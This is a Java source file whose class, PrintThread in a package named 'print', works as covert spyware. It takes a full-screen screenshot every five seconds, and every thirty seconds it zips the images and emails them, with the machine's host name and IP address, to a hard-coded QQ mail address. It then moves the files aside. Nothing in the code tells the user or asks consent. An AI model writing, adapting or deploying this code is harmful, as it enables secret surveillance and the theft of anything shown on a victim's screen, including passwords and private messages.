package org.print;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.text.SimpleDateFormat;
import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;
import javax.mail.MessagingException;

import org.file.FileUtil;
import org.mail.MailUtil;
import org.zip.ZipUtil;

public class PrintThread extends Thread {
	private static SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd-HH-mm-ss");
	private static final String DEFAULT_PATH = "D:/hange_file/hange";
	private static final String DEFAULT_TYPE = "png";
	private static final long DEFAULT_SENDMAIL_TIME = 30000;
	private static final long DEFAULT_GETIMAGE_TIME = 5000;
	
	private String fileName;//文件的前缀
	private String filePath;//文件的父目录
	private String imageFormat;//图像文件的格式
	private long sendMailTime;//发送邮件间隔时间
	private long getImageTime;//获取截图间隔时间
	private Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
	
	public PrintThread() {
		imageFormat = DEFAULT_TYPE;
		filePath = DEFAULT_PATH;
		sendMailTime = DEFAULT_SENDMAIL_TIME;
		getImageTime = DEFAULT_GETIMAGE_TIME;
		File path = new File(filePath);
		if (!path.exists()) {
			path.mkdirs();
		}
	}
	
	public void snapShot() {
		try {
			fileName = filePath + "/" + sdf.format(System.currentTimeMillis());
			// 拷贝屏幕到一个BufferedImage对象screenshot
			BufferedImage screenshot = new Robot().createScreenCapture(
					new Rectangle(0, 0, (int) dimension.getWidth(), (int) dimension.getHeight()));
			// 根据文件前缀变量和文件格式变量，自动生成文件名
			String name = fileName + "." + imageFormat;
			//   将screenshot对象写入图像文件
			ImageIO.write(screenshot, imageFormat, new File(name));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void run() {
		new Timer().schedule(new TimerTask() {
			@Override
			public void run() {
				try {
					sendMail();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}, sendMailTime, sendMailTime);
		while (true) {
			snapShot();
			try {
				Thread.sleep(getImageTime);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	private static void sendMail() throws Exception {
		MailUtil email = new MailUtil();
		email.setTo(new String[]{"476864279@qq.com"});
		InetAddress host = InetAddress.getLocalHost();
		String content = "主机名称: " + host.getHostName() +" ip:" + host.getHostAddress();
		email.setSubject("桌面信息");
		email.setContent(content);
		File path = new File(DEFAULT_PATH);
		String []fileList = null;
		String []nameList = null;
		if (path.exists()) {
			nameList = path.list();
		}
		if (nameList != null) {
			String zipname = DEFAULT_PATH + "_" + sdf.format(System.currentTimeMillis()) + ".zip";
			ZipUtil.zip(DEFAULT_PATH, zipname);
			fileList = new String[]{zipname};
			email.setFileList(fileList);
		}
		try {
			email.sendMessage();
			for (String file:nameList) {
				FileUtil.changeDirectory(DEFAULT_PATH + "/" + file, DEFAULT_PATH + "_back", true);
			}
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			e.printStackTrace();
		}
	}
} 